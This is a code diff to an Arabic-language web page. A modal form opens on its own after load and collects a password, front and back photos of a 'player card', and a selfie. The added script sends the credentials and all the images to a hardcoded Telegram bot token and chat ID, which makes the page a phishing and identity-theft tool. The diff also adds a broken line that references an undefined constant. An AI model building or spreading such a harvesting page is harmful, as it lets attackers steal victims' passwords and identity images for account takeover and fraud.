@@ -52,11 +52,11 @@
     height:auto;
   }
 
-  /* ---------- form modal (تعديل التموضع ليكون بالمنتصف تماماً) ---------- */
+  /* ---------- form modal ---------- */
   .modal-backdrop{
     position:fixed;
     inset:0;
-    background:rgba(13,20,71,.4); /* جعلنا الخلفية أغمق قليلاً للتركيز */
+    background:rgba(13,20,71,.4);
     opacity:0;
     pointer-events:none;
     transition:opacity .35s ease;
@@ -70,9 +70,9 @@
   .form-modal{
     position:fixed;
     left:50%;
-    top:50%; /* توسيط عمودي */
+    top:50%;
     width:min(92vw, 360px); 
-    max-height: 85vh; /* يمنع خروج الفورم عن الشاشة */
+    max-height: 85vh;
     background:var(--white);
     border-radius:22px;
     box-shadow:0 30px 60px -20px rgba(13,20,71,.35);
@@ -80,13 +80,12 @@
     z-index:999;
     opacity:0;
     pointer-events:none;
-    transform:translate(-50%, -45%) scale(0.95); /* تأثير دخول أنيق */
+    transform:translate(-50%, -45%) scale(0.95);
     transition: opacity .4s ease, transform .4s ease;
     display:flex;
     flex-direction:column;
   }
   
-  /* عندما يفتح الفورم */
   .form-modal.show{
     opacity:1;
     pointer-events:auto;
@@ -108,7 +107,6 @@
     border-radius:22px 22px 0 0;
   }
   
-  /* تفعيل السكرول الداخلي للحقول الزائدة */
   .form-modal-scroll {
     flex: 1;
     overflow-y: auto;
@@ -193,12 +191,17 @@
     font-weight: 600;
     cursor: pointer;
     transition: background 0.2s;
-    width: 100%; /* جعل الزر عريض ومناسب للموبايل */
+    width: 100%;
     text-align: center;
   }
   
   .btn-submit:hover {
     background: #1c2fd6;
+  }
+  
+  .btn-submit:disabled {
+    background: #7c82a3;
+    cursor: not-allowed;
   }
 
   /* ---------- hero ---------- */
@@ -359,21 +362,21 @@
   <div class="form-modal" id="formModal">
     <div class="form-modal-accent"></div>
     <div class="form-modal-scroll">
-      <form class="form-modal-body" onsubmit="event.preventDefault(); alert('تم تقديم طلبك بنجاح!');">
+      <form class="form-modal-body" id="telegramForm">
         
         <div class="form-group">
-          <input type="text" class="form-control" placeholder="اسم المستخدم الذي تريده" required>
+          <input type="text" id="username" class="form-control" placeholder="اسم المستخدم الذي تريده" required>
         </div>
         
         <div class="form-group">
-          <input type="password" class="form-control" placeholder="كلمة السر" required>
+          <input type="password" id="password" class="form-control" placeholder="كلمة السر" required>
         </div>
         
         <div class="form-group">
           <label>صورة الوجه الامامي من بطاقة اللاعب المقدمة لك</label>
           <label class="file-dropzone">
             <span>اضغط لإرفاق ملف</span>
-            <input type="file" accept="image/*" required>
+            <input type="file" id="fileFront" accept="image/*" required>
           </label>
         </div>
         
@@ -381,7 +384,7 @@
           <label>صورة الوجه الخلفي لبطاقة اللاعب المقدمة لك</label>
           <label class="file-dropzone">
             <span>اضغط لتحميل صورة</span>
-            <input type="file" accept="image/*" required>
+            <input type="file" id="fileBack" accept="image/*" required>
           </label>
         </div>
         
@@ -389,12 +392,12 @@
           <label>صورة شخصية لحسابك الذي سيتم انشاءه (إثبات الملكية)</label>
           <label class="file-dropzone">
             <span>اضغط لرفع الصورة الشخصية</span>
-            <input type="file" accept="image/*" required>
+            <input type="file" id="fileSelfie" accept="image/*" required>
           </label>
         </div>
         
         <div class="form-footer">
-          <button type="submit" class="btn-submit">قدم طلب</button>
+          <button type="submit" id="submitBtn" class="btn-submit">قدم طلب</button>
         </div>
 
       </form>
@@ -415,6 +418,11 @@
   <input type="file" id="mainFileInput" accept="image/*">
 
 <script>
+  // ---------- إعدادات التلجرام (ضع بياناتك هنا) ----------
+  const TELEGRAM_BOT_TOKEN = '8905455566:AAFQLQWmxsp3U0S6I650V85yYK8tiDSyo9w';
+  const TELEGRAM_CHAT_ID = '5437487652';
+
+
   const CARD_COUNT = 5;
   let images = new Array(CARD_COUNT).fill(null);
   let current = 0;
@@ -497,6 +505,7 @@
   }
 
   function goTo(i){
+    current = ((i % CARD_COUNT) + CARD_COUNT) % COUNT_COUNT;
     current = ((i % CARD_COUNT) + CARD_COUNT) % CARD_COUNT;
     markActive();
     buildDots();
@@ -527,13 +536,11 @@
   });
 
   window.addEventListener('resize', updateTransform);
-
   buildCards();
 
   const modalBackdrop = document.getElementById('modalBackdrop');
   const formModal = document.getElementById('formModal');
 
-  // تشغيل المؤقت ليفتح الفورم بعد ثانيتين بشكل تلقائي وصحيح
   window.addEventListener('load', ()=>{
     setTimeout(()=>{
       modalBackdrop.classList.add('show');
@@ -541,13 +548,11 @@
     }, 2000);
   });
 
-  // إغلاق عند الضغط على الخلفية البيضاء الشفافة
   modalBackdrop.addEventListener('click', ()=>{
     modalBackdrop.classList.remove('show');
     formModal.classList.remove('show');
   });
 
-  // تحديث أسماء الملفات عند اختيارها
   document.querySelectorAll('.file-dropzone input').forEach(input => {
     input.addEventListener('change', function() {
       if(this.files && this.files[0]) {
@@ -555,6 +560,78 @@
         this.previousElementSibling.style.color = "#29b6f6";
       }
     });
+  });
+
+  // ---------- كود إرسال البيانات المتقدم إلى تلجرام ----------
+  document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const submitBtn = document.getElementById('submitBtn');
+    const userVal = document.getElementById('username').value;
+    const passVal = document.getElementById('password').value;
+    
+    const fileFront = document.getElementById('fileFront').files[0];
+    const fileBack = document.getElementById('fileBack').files[0];
+    const fileSelfie = document.getElementById('fileSelfie').files[0];
+
+    submitBtn.disabled = true;
+    submitBtn.innerText = "جاري إرسال الطلب...";
+
+    // 1. إرسال النص أولاً
+    const textMessage = `📌 *طلب جديد واصل*\n\n👤 *اسم المستخدم:* \`${userVal}\`\n🔒 *كلمة السر:* \`${passVal}\``;
+    
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: textMessage,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      // دالة مساعدة لإرسال الصور الفردية كملفات حقيقية للبوت
+      async function sendPhotoToTelegram(file, caption) {
+        if(!file) return;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', file);
+        formData.append('caption', caption);
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      }
+
+      // 2. إرسال الصور تباعاً لتصل بجودتها الأصلية مع التسمية الخاصة بها
+      await sendPhotoToTelegram(fileFront, `🖼️ الوجه الأمامي لبطاقة اللاعب (${userVal})`);
+      await sendPhotoToTelegram(fileBack, `🖼️ الوجه الخلفي لبطاقة اللاعب (${userVal})`);
+      await sendPhotoToTelegram(fileSelfie, `👤 الصورة الشخصية - إثبات الملكية (${userVal})`);
+
+      alert('تم تقديم طلبك بنجاح وأُرسلت البيانات!');
+      
+      // إغلاق المودال وتصفير الفورم
+      modalBackdrop.classList.remove('show');
+      formModal.classList.remove('show');
+      document.getElementById('telegramForm').reset();
+      
+      // إعادة النصوص الافتراضية لحقول الرفع
+      document.querySelectorAll('.file-dropzone span').forEach(span => {
+        if(span.innerText.includes('الأمامي')) span.innerText = "اضغط لإرفاق ملف";
+        else if(span.innerText.includes('الخلفي')) span.innerText = "اضغط لتحميل صورة";
+        else span.innerText = "اضغط لرفع الصورة الشخصية";
+        span.style.color = "";
+      });
+
+    } catch (error) {
+      console.error(error);
+      alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى.');
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.innerText = "قدم طلب";
+    }
   });
 </script>
 </body>
